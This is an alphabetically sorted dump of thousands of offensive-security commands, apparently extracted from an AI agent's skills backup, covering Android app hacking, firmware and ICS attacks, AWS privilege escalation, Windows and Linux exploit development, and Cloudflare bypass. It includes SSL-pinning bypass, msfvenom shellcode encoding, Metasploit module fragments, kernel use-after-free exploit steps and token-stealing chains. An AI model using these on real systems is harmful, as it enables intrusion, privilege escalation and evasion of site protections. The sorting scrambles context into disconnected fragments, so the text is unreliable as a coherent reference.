adb pull /data/app/.../base.apk # Pull base APK
adb pull /data/app/.../split_config.arm64_v8a.apk # Pull split APKs
adb pull /data/data/com.app/ ./ # Pull app data
adb pull /sdcard/screen.png ./ # Pull screenshot
adb push file.apk /sdcard/ # Push file to device
adb push test.apk /sdcard # Upload via sdcard
adb restore myapp_backup.ab # Restore backup to device
adb reverse tcp:8080 tcp:8080 # Reverse forward
adb root # Restart adbd as root
adb shell # Interactive shell
adb shell am broadcast -a com.target.ACTION --es key val
adb shell am compat disable BLOCK_UNTRUSTED_TOUCHES com.example.victim
adb shell am compat reset BLOCK_UNTRUSTED_TOUCHES com.example.victim
adb shell am start -a android.intent.action.VIEW \
adb shell am start -n com.target/.ProxyActivity \
adb shell am start -n pkg/.Activity --es key val --ei num 123 --ez flag true
adb shell am start \
adb shell am startservice -n pkg/.Service
adb shell cmd content call --uri content://provider --method evilMethod --arg 'foo'
adb shell cmd content insert --uri content://provider/path --bind col:s:val
adb shell cmd content query --uri content://provider/path
adb shell cmd content update --uri content://provider/path --bind col:s:val --where "1=1"
adb shell ls # Execute single command
adb shell pidof com.your.application # Get PID
adb shell pm clear com.test.app # Delete all app data
adb shell pm list packages -3 # Third-party packages only
adb shell pm list packages -3 -e BIND_ACCESSIBILITY_SERVICE
adb shell pm path com.example.app # Get all APK paths
adb shell screencap /sdcard/screen.png
adb shell screenrecord --time-limit 30 /sdcard/demo.mp4
adb shell screenrecord /sdcard/demo.mp4
adb tcpip 5555 # Enable network ADB
adb uninstall -k com.test.app # Keep data/cache after uninstall
adb uninstall com.test.app # Uninstall
add-int/lit8 v0, v2, 0x1 # v0 = v2 + 1
addr.writeByteArray(bytes);
alert(javascriptBridge.getSecret());
android heap print_instances com.example.UserData
android hooking get current_activity
android hooking list activities
android hooking list class_methods com.example.MainActivity # List methods
android hooking list classes # All loaded classes
android hooking list receivers
android hooking list services
android hooking search classes com.example # Search classes
android hooking search methods password # Search methods
android hooking set return_value "com.example.PinUtil.checkPin" true
android hooking watch class com.example.MainActivity --dump-args --dump-return
android hooking watch class_method com.example.MainActivity.sum --dump-args --dump-backtrace --dump-return
android root disable
android root simulate
android shell_exec whoami
android sslpinning disable
```

## EMBEDDED / IOT / FIRMWARE

```bash
(1) # SPI mode → configure speed/polarity
- CodeBuild buildspec.yml environment variables
- Container instance backdooring (modify user data)
- ControlThings Platform: ICS security assessment (formerly SamuraiSTFU)
- EC2 User Data (contains bootstrap scripts with creds)
- Engineering workstation compromise (HMI, SCADA master)
- Environment property secrets
- Firmware backdooring/replacement (persist across power cycles)
- GRFICSv2: Unity 3D ICS simulation (command injection, MITM, buffer overflow)
- HMI exploitation (web-based HMIs with XSS/CSRF)
- Hardcoded secrets in environment variables
- IT→OT pivot (from corporate network to control network)
- LICSTER: Low-cost ICS Security Testbed for Education and Research
- Lambda environment variables
- Lambda layer manipulation
- Metadata API credential theft (169.254.170.2 for ECS)
- Misconfigured S3 source bundle bucket
- Moki Linux: Kali modification with ICS/SCADA tools
- Overly permissive bucket policies (Principal: *)
- PLC logic manipulation (data-oriented attacks vs code injection)
- Protocol MITM (Modbus/DNP3 without auth)
- Public buckets with sensitive data
- SSM Parameter Store (misconfigured permissions)
- Safety Instrumented System attacks (TRISIS class)
- Static website hosting exposing bucket contents
- Supply chain attacks on ICS vendors
- Task definition manipulation (add privileged container)
- Vulnerable function code (command injection, SSRF)
- ec2:AssociateIamInstanceProfile → attach admin profile to compromised EC2
- iam:AttachUserPolicy → attach AdministratorAccess to self
- iam:CreateAccessKey → create keys for higher-priv user
- iam:PassRole + lambda:CreateFunction → exec code with admin role
- iam:PutUserPolicy → inline admin policy on self
- iam:UpdateAssumeRolePolicy → modify trust to assume admin role
- lambda:UpdateFunctionCode to inject backdoor
--align 8 --version 1.0.0 --pad-header app.bin signed.bin
-initrd initramfs.cpio.gz -nographic -append "console=ttyAMA0"
-p 47808:47808 -p 21:21 -p 80:80 \
./UEFITool firmware.bin # GUI
./build-firmware.sh firmware.bin
./controls can0 # Control panel
./extract-firmware.sh firmware.bin
./firmwalker.sh _firmware.bin.extracted/ results.txt
./icsim can0 & # Start simulator
./run.sh -c <brand> <firmware.bin>
1. IMDSv1 Exploitation
2. IAM Privilege Escalation
2018 LoJax → First UEFI rootkit found in wild
2020 MosaicRegressor → Multi-component framework with UEFI implant
2020 TrickBoot → Trickbot firmware-level persistence module
2021 ESPecter → Bootkit on EFI System Partition (ESP)
2021 FinSpy → Commercial UEFI bootkit in surveillance software
2022 BlackLotus → UEFI bootkit bypassing Secure Boot on Win11
2022 CosmicStrand → UEFI firmware rootkit, DXE driver persistence
2024 Bootkitty → First UEFI bootkit targeting Linux
3. S3 Misconfigurations
4. Lambda Exploitation
5. Credential Leakage
6. Cross-Service Pivoting
7. Elastic Beanstalk
8. ECS/Container
AFL++, QEMU, Unicorn, Qiling Framework # Emulation & fuzzing
AFL_QEMU_CUSTOM_BIN=1 AFL_PRELOAD=libhook.so \
AMD PSP | Platform Security Processor — ARM Cortex-A5
AMT provisioning bypass → full remote control
APT campaign using leaked Hacking Team tools
ATT&CK for ICS (MITRE) → Tactic/technique matrix for OT environments
Advanced stealth, network C2
Apple AirTag → Thomas Roth (stacksmashing)
Attack Vector | Description
Attack Vectors:
BDS | Boot Device Selection — UEFI boot manager
BMC → Baseboard Management Controller (server remote mgmt)
BadBIOS → Alleged firmware malware, controversial
BeanStalk → environment variables → IAM → Secrets Manager
Binarly → efiXplorer, FwHunt, major vulnerability disclosures
BlackEnergy/Industroyer → Ukrainian power grid attacks (2015-2016)
CHIPSEC, UEFITool, fwhunt-scan # Analysis
Centrifuge sabotage via frequency manipulation at Natanz
Checks for writable SPI flash, injects implant
Claims: air-gap jumping via ultrasonic, cross-platform
Compromised ICS vendor websites → trojanized installers
Cr4sh → AMI Aptio firmware exploitation, SMM backdoors
Custom firmware on AirTag
DMA Attacks | Thunderbolt/PCIe DMA → read/write system memory
DVUEFI: Damn Vulnerable UEFI exploitation learning platform
DXE | Driver Execution Environment — main UEFI phase
D^3CTF 2022: d3guard (SMM challenge)
Debug interface via SWD
Defense: ECC memory, increased refresh rate
Defense: IOMMU, Thunderbolt Security Level, Kernel DMA Protection
Defense: USB device whitelisting, port blockers
Defense: tamper-evident seals, heads firmware
Designed to cause physical damage
Dubhe CTF 2024: ToySMM
ESET Research → LoJax, BlackLotus, ESPecter, NVRAM vulns (CVE-2022-3430)
ESP32-C3/C6 fault injection → Kevin Courdesses
Eclypsium → Bootloader vulnerabilities, iLOBleed implant
Evil Maid → Physical access while unattended
Exploits CVE-2022-21894 (Baton Drop)
Firmware attack timelines and threat detection
Flash encryption bypass via EMFI
Flip bits in page tables, kernel memory
FreeRTOS | MQTT over TLS, PKCS#11, PSA Certified
GRASSMARLIN, Conpot, GasPot # Recon & honeypots
Ghidra, radare2/rizin, Binary Ninja # Reverse engineering
Hardware crypto wallet $2M → Joe Grand (Kingpin)
Havex → OPC scanning + data exfiltration
ICS-Specific Distributions:
IEC 62443 → IACS security standards series
IPMI → Legacy server management, plaintext auth common
Industroyer2: IEC 61850 GOOSE message injection
Infected UEFI bootloaders for persistence
Install firmware malware, keylogger, or bootkit
Integrated glitching platform
Intel Boot Guard | Hardware-enforced boot integrity before UEFI
Intel ME | Management Engine — separate CPU running MINIX
Intel SMM race conditions, BIOS HID driver bugs
Intel TXT | Trusted Execution Technology — measured launch
JSON over HTTPS, but implementation bugs persist
JTAG access + NAND flash dump
Keystroke injection at superhuman speed
KillerBee (zbdsniff, zbstumbler) # Zigbee
Lenovo firmware exploitation, Boot Guard bypass
LogoFAIL | Image parsing vulns during boot logo display (Black Hat EU 2023)
LogoFAIL, PixieFail response, PKFail (leaked platform keys)
Measured Boot | Records hashes of every boot component in TPM PCRs
Modified in-memory firmware of safety controllers
Modifies Windows Boot Manager on ESP
NVRAM Attacks | Set UEFI variables to disable Secure Boot
No filesystem traces, hidden in SPI flash
OpenBMC: main open-source implementation
Option ROM Exploitation | Malicious PCIe device firmware executing during boot
PEI | Pre-EFI Initialization — minimal init, memory discovery
Persists in iLO firmware, invisible to OS
Phase | Description
Philips Hue Bridge root → Colin O'Flynn
PicoGlitcher # Low-cost glitching
PixieFail | 9 vulns in Tianocore EDK II IPv6 network stack (PXE boot)
Pre-EFI (Boot Guard) | Intel Boot Guard: hardware-enforced boot integrity
Proxmark3, ChameleonUltra # RFID/NFC
Qiling Framework (EFI mode) # Emulation
Quarkslab → PixieFail (EDK II IPv6), Samsung TrustZone
ROPGadget --binary firmware.bin --arm # ARM gadgets
ROPGadget --binary firmware.bin --thumb # ARM Thumb gadgets
RT | Runtime — UEFI Runtime Services active alongside OS
RT-Thread | Growing IoT OS from China
RTOS | Security Features
Read/write arbitrary memory, steal disk encryption keys
Readout protection bypass on SoC
```

## EXPLOIT DEVELOPMENT / BROWSER

```bash
!analyze -v # Automatic crash analysis
!db <address> L64 # Dump 64 bytes
!dd <address> L16 # Dump 16 dwords
!devobj <DEVOBJ> # Device object
!dq <address> L8 # Dump 8 qwords
!drvobj <DRVOBJ> # Driver object and dispatch table
!exchain # View SEH chain
!heap -flt s <size> # Chunks of specific size
!heap -flt s <size> # Filter chunks by size
!heap -p -a <address> # Page heap info for address
!heap -s # Heap summary
!heap -s # List heaps
!heap -stat -h <heap> # Allocation stats
!heap -stat -h <heap> # Heap statistics
!irp <IRP_ADDR> # IRP details
!mona bytearray -b '\x00' # Generate test array
!mona compare -f c:\logs\app\bytearray.bin -a ESP_ADDRESS
!mona config -set workingfolder c:\logs\%p
!mona findmsp # Find offsets
!mona findmsp # Find offsets after crash
!mona findmsp # Find offsets from EIP/ESP/SEH after crash
!mona jmp -r esp -n -o
!mona jmp -r esp -n -o # JMP ESP (no rebase, no ASLR, no OS DLLs)
!mona modules # List modules with protection flags
!mona pc 5000 # Generate pattern
!mona pc 5000 # Generate pattern of length 5000
!mona rop -m *.dll -cpb '\x00\x0a\x0d' # Filter bad bytes
!mona rop -m *.dll -cpb '\x00\x0a\x0d' # With bad char filtering
!mona rop -m module.dll
!mona rop -m module.dll # All gadgets in module
!mona rop -m module.dll -n # Exclude null bytes
!mona ropfunc -m module.dll -cpb '\x00' # Include API pointers
!mona seh -n # POP POP RET from non-SafeSEH modules
!mona update
!object <address> # Object type and reference count
!pool <addr> # Pool info
!pool <address> # Pool allocation info
!process 0 0 # List all processes
!process 0 0 chrome.exe # List processes
!process <EPROCESS> 7 # Detailed process info with full stack
!py mona # Run mona
!teb # View TEB
!thread <ETHREAD> # Thread information
!token # Show token
!token <TOKEN_ADDR> # Token details (privileges, groups)
"""Mutate one byte at position = iteration % len(data)"""
"@ -Architecture x86
$HandleTableEntry = $PEB.GdiSharedHandleTable + ($Handle -band 0xffff) * $_GDI_CELL_Size
$KernelObj = ReadMemory($HandleTableEntry)
$PEB = Get-PEB
$assembly = Get-KeystoneAssembly -Assembly @"
$cmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("d2hvYW1p"))
$pvScan0 = $KernelObj + $pvScan0Offset
%<N>$ = Direct Parameter Access (target Nth parameter)
%DebugPrint(obj) # Object layout/map info
%DebugPrint(obj); %OptimizeFunctionOnNextCall(fn); %SystemBreak()
%DeoptimizeFunction(fn) # Force deopt
%HasFastProperties(obj) # Check property storage mode
%HaveSameMap(a, b) # Compare object shapes
%OptimizeFunctionOnNextCall(fn) # Force TurboFan compilation
%SystemBreak() # Trap to debugger
%hhn = write 1 byte (single byte — precision overwrite)
%hn = write 2 bytes (short)
%n = write count of bytes written to address from stack
%s = string at address from stack
%x = hex value from stack
&("who"+"ami")
'Author' => ['corelanc0d3r'],
'BadChars' => "\x00\x0a\x0d",
'DefaultTarget' => 0))
'Description' => 'Stack buffer overflow in App X v1.0',
'DisclosureDate' => '2024-01-01',
'EncoderType' => Msf::Encoder::Type::AlphanumMixed,
'License' => MSF_LICENSE,
'Name' => 'Application Buffer Overflow',
'Payload' => {
'Platform' => 'win',
'References' => [['CVE', '2024-XXXX'], ['URL', 'http://...']],
'Space' => 1000,
'Targets' => [
("Flags", ctypes.c_ulong),
("ImageBase", ctypes.c_void_p),
("ImageName", ctypes.c_char * 256),
("ImageSize", ctypes.c_ulong),
("Index", ctypes.c_ushort),
("LoadCount", ctypes.c_ushort * 2),
("ModuleNameOffset", ctypes.c_ushort * 2),
("Reserved1", ctypes.c_ulong * 2),
("Unknown", ctypes.c_ushort),
(cat /proc/version; uname -a; cat /etc/os-release; echo $PATH; env; id; sudo -l) 2>/dev/null
- Child triggers unlink (epoll_ctl EPOLL_CTL_DEL) -> corrupts iovecStack[10].iov_len
- DLL search order: place malicious DLL in current directory
- Default credentials, hardcoded passwords
- Direct EIP overwrite: jmp esp gadget → shellcode
- HalDispatchTable overwrite → syscall trigger → kernel shellcode
- NULL page mapping → controlled kernel read
- Parent reads leaked kernel data -> extracts task_struct pointer
- Parent reallocates via writev with crafted iovec (25 iovecs = 400 bytes)
- Same UAF + iovec realloc -> overwrite iovec pointers
- Token stealing: OpenProcessToken → DuplicateTokenEx → CreateProcessWithToken
- Web management interface → upload → execute
- Write 0xFFFFFFFFFFFFFFFE to task_struct->thread.addr_limit
- epoll_ctl links binder_thread wait queue
- fork() -> child sleeps 2s, parent frees binder_thread (BINDER_THREAD_EXIT)
- open /dev/binder, epoll_create, pipe with PAGE_SIZE capacity
-1, ctypes.byref(null_page), 0, ctypes.byref(0x1000), 0x3000, 0x40
-> Race condition UAF -> virtual method dispatch hijack -> RCE
-e x86/alpha_mixed -f python # Alphanumeric shellcode
-e x86/alpha_mixed -f python BUFFERREGISTER=ESP
-e x86/shikata_ga_nai -i 5 -f python -b '\x00\x0a\x0d'
-f python -b '\x00'
-f python -b '\x00\x0a\x0d' EXITFUNC=thread
../configure --enable-debug --disable-optimize
../configure --enable-debug --disable-optimize; make -j$(nproc)
./Fuzzilli --profile=jsc ./jsc
./Fuzzilli --profile=spidermonkey ./js
./Fuzzilli --profile=v8 ./d8
./WebKitBuild/Debug/bin/jsc poc.js
./build/install-build-deps.sh
.add_inplace(v) // In-place add
.load pykd.pyd # Load Python extension
.reload /f
.reload /f # Force symbol reload
.reload /f ntoskrnl.exe
.sub_inplace(v) // In-place subtract
.sympath srv*c:\symbols*http://msdl.microsoft.com/download/symbols
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x356b4234
0x00 0x41 = inc ecx (0x0041)
0x00 0x42 = inc edx (0x0042)
0x00 0x50 = push eax (0x0050)
0x00 0x6A = push imm8 (0x006A)
1. BOF → EIP control → shellcode (40% of Windows exploits)
1. Exported components (40%): AndroidManifest.xml → exported=true → intent hijack
1. Hardcoded credentials (50%+) — admin:admin, root:root, guest:guest
1. Jailbreak exploits (50%): kernel patches, codesigning bypass
1. Renderer RCE (JS engine bug)
1. SUID binary abuse: find / -perm -4000 → check GTFOBins
2. Command injection in diagnostic tools — ping, traceroute, nslookup
2. Privilege escalation (25%)
2. Sandbox Escape (IPC/kernel bug)
2. Sudo misconfigurations: sudo -l → NOPASSWD on dangerous binary
2. URL scheme hijacking (20%): custom URL handler → unauthorized actions
2. WebView issues (25%): addJavascriptInterface → no origin check → XSS → RCE
3. Auth bypass → RCE (20%)
3. Content provider leaks (20%): exported content provider → SQL injection → data leak
3. Kernel Privilege Escalation
3. Kernel exploit (dirtycow, dirtypipe, overlayfs): uname -r → searchsploit kernel
3. Unauthenticated configuration changes — POST to /cgi-bin/config
4. ATS bypass: NSAppTransportSecurity → NSAllowsArbitraryLoads
```

## EVASION / CLOUDFLARE BYPASS

```bash
--disable-breakpad
--disable-dev-shm-usage
--disable-features=IsolateOrigins,site-per-process
--disable-infobars
--disable-search-engine-choice-screen
--disable-session-crashed-bubble
--homepage=about:blank
--no-first-run
--no-pings
--no-service-autorun
--password-store=basic
--remote-allow-origins=*
--start-maximized
-> Execute JS in real browser context
-> Extract challenge script
-> Relay cookie + matching UA + IP to actual requests
-> Submit solution -> Get cf_clearance cookie
@browser(
@browser(async_queue=True) # Returns queue object with .put() and .get()
@browser(async_queue=True, sequential=True)
@browser(async_queue=True, skipDuplicateInput=True)
@browser(cache="REFRESH") # Force refresh cache
@browser(cache=True) # Cache results to disk
@browser(cache=True, expires_in=timedelta(hours=24)) # TTL
@browser(max_retry=3, retry_wait=5) # Retry up to 3 times, wait 5s between
@browser(parallel=5) # Run 5 browser instances in parallel
@browser(proxy="http://user:pass@host:port")
@browser(proxy=["http://p1:8080", "http://p2:8080", "http://p3:8080"])
@browser(proxy=lambda data: get_proxy_for_domain(data["url"]))
@browser(reuse_driver=True) # Reuse browser instance across tasks
@request(parallel=10) # Run 10 HTTP requests in parallel
@request(proxy="http://proxy:8080", user_agent="...")
@task(parallel=10)
@task(parallel=3) # Run 3 tasks in parallel
IPUtils.get_ip() # Returns current public IP
IPUtils.get_ip_info() # Returns geolocation, ISP, coordinates
Request -> 403/503 + Challenge Page
Server.rate_limit = {"browser": 1, "request": 30, "task": 30}
block_images=True, # Block images (reduce proxy cost)
block_images_and_css=True, # Block images+CSS (max cost reduction)
const browser = await chromium.connectOverCDP(`http://localhost:${port}`);
const { port, kill } = await ChromeLauncher.launch({ chromeFlags: flags });
def my_scraper(request, data):
def process_data(data):
def scrape(driver, data):
driver.get("https://target.com", bypass_cloudflare=True)
driver.google_get() # Google referral spoofing
driver.type("#search", data["query"]) # Human-like typing
extensions=[path_to_crx], # Extension loading
from botasaurus.ip_utils import IPUtils
http.favicon.hash:<hash>
http.title:"Target Title"
lang="en-US", # Language spoofing
org:"Cloudflare, Inc."
profile="my_profile",
proxy="http://user:pass@host:port",
queue = my_scraper()
queue.put(data1)
queue.put(data2)
response = request.get("https://example.com")
results = queue.get() # Drain and get all results
return response.json()
return transform(data)
ssl.cert.subject.cn:"target.com"
tiny_profile=True, # Minimal profile to reduce fingerprint surface
user_agent="Mozilla/5.0 ...",
user_agent=lambda data: random_ua(), # Dynamic per-request UA
window_size="1920x1080"
window_size=lambda: random.choice(["1920x1080", "1366x768"]), # Randomized
```


---

> Total unique commands extracted: 6071
> Organized from 1,273 code blocks across 22 skills
> Source: /root/prometheus-agent/skills-backup/
